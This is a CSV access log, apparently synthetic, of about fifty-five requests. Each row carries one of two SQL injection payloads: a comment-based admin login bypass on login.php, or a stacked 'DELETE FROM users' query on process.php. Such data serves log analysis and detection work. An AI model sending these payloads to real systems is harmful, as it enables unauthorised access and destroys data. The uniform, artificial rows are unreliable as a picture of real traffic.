IP,Time,URL,Status
82.234.147.138,2023-04-04 14:11:08,GET /login.php?user=admin';--,302
214.214.246.126,2023-10-12 07:55:16,GET /login.php?user=admin';--,200
40.35.69.134,2023-06-14 18:06:00,GET /login.php?user=admin';--,302
19.216.147.114,2023-07-09 11:14:28,POST /process.php?id=1; DELETE FROM users;--,302
62.228.136.96,2023-03-31 02:35:15,GET /login.php?user=admin';--,302
190.241.24.82,2023-11-05 03:25:42,POST /process.php?id=1; DELETE FROM users;--,200
161.42.238.4,2023-11-24 16:47:18,POST /process.php?id=1; DELETE FROM users;--,404
44.139.75.54,2023-03-03 12:33:17,GET /login.php?user=admin';--,404
114.3.63.57,2023-09-14 16:19:15,GET /login.php?user=admin';--,404
138.117.224.133,2023-01-12 15:55:16,GET /login.php?user=admin';--,404
66.129.126.136,2023-09-06 18:28:40,GET /login.php?user=admin';--,200
54.60.22.129,2023-02-14 17:59:57,POST /process.php?id=1; DELETE FROM users;--,200
40.226.232.220,2023-04-22 00:02:55,GET /login.php?user=admin';--,302
204.21.25.13,2023-01-22 20:52:44,POST /process.php?id=1; DELETE FROM users;--,302
126.5.198.134,2023-08-09 23:10:29,POST /process.php?id=1; DELETE FROM users;--,404
216.65.106.134,2023-01-25 23:12:39,POST /process.php?id=1; DELETE FROM users;--,200
114.61.95.213,2023-06-28 20:51:08,GET /login.php?user=admin';--,302
71.197.221.138,2023-09-19 02:10:41,POST /process.php?id=1; DELETE FROM users;--,200
77.44.123.152,2023-07-24 19:59:07,POST /process.php?id=1; DELETE FROM users;--,200
207.206.249.188,2023-11-26 10:41:51,GET /login.php?user=admin';--,404
89.76.164.88,2023-03-07 11:03:11,POST /process.php?id=1; DELETE FROM users;--,200
7.42.158.162,2023-09-28 10:01:31,GET /login.php?user=admin';--,200
24.187.89.130,2023-09-18 15:13:47,POST /process.php?id=1; DELETE FROM users;--,200
45.7.173.179,2023-01-20 15:13:38,GET /login.php?user=admin';--,302
194.48.138.201,2023-03-07 10:17:50,GET /login.php?user=admin';--,302
2.144.227.197,2023-11-01 00:38:30,GET /login.php?user=admin';--,302
41.122.2.3,2023-03-04 16:34:26,GET /login.php?user=admin';--,404
166.236.77.153,2023-01-04 22:42:43,POST /process.php?id=1; DELETE FROM users;--,404
211.210.159.219,2023-03-25 02:06:57,GET /login.php?user=admin';--,200
202.89.136.94,2023-09-03 19:15:19,GET /login.php?user=admin';--,404
49.142.217.121,2023-08-15 14:23:10,GET /login.php?user=admin';--,302
94.117.254.47,2023-02-26 11:58:56,GET /login.php?user=admin';--,200
12.89.129.24,2023-10-16 11:17:41,POST /process.php?id=1; DELETE FROM users;--,302
78.228.93.50,2023-05-15 05:38:26,GET /login.php?user=admin';--,200
112.189.244.198,2023-05-13 22:58:36,POST /process.php?id=1; DELETE FROM users;--,200
6.152.1.204,2023-01-23 23:15:27,POST /process.php?id=1; DELETE FROM users;--,302
33.251.33.50,2023-10-30 02:38:45,GET /login.php?user=admin';--,404
131.90.167.7,2023-05-22 04:40:20,GET /login.php?user=admin';--,200
91.189.227.90,2023-01-23 04:47:13,GET /login.php?user=admin';--,302
86.111.123.231,2023-07-12 07:43:18,POST /process.php?id=1; DELETE FROM users;--,302
148.123.61.19,2023-08-15 01:53:38,GET /login.php?user=admin';--,200
66.186.191.102,2023-06-09 13:46:57,GET /login.php?user=admin';--,302
153.44.252.191,2023-10-25 10:43:11,POST /process.php?id=1; DELETE FROM users;--,404
80.132.249.229,2023-02-15 17:44:36,GET /login.php?user=admin';--,404
60.103.245.183,2023-04-16 10:21:42,GET /login.php?user=admin';--,302
191.77.202.42,2023-07-10 13:54:34,GET /login.php?user=admin';--,200
165.222.201.47,2023-01-21 18:54:56,POST /process.php?id=1; DELETE FROM users;--,200
145.180.140.59,2023-07-06 05:14:52,POST /process.php?id=1; DELETE FROM users;--,302
179.59.11.124,2023-03-15 02:27:59,POST /process.php?id=1; DELETE FROM users;--,200
173.81.180.61,2023-03-11 19:54:56,GET /login.php?user=admin';--,302
117.152.94.30,2023-04-08 08:20:05,POST /process.php?id=1; DELETE FROM users;--,404
15.186.182.250,2023-03-14 00:32:43,POST /process.php?id=1; DELETE FROM users;--,302
174.79.30.53,2023-04-17 12:05:46,POST /process.php?id=1; DELETE FROM users;--,200
157.169.237.82,2023-05-12 16:24:58,POST /process.php?id=1; DELETE FROM users;--,302
120.70.124.17,2023-09-13 00:10:45,POST /process.php?id=1; DELETE FROM users;--,302
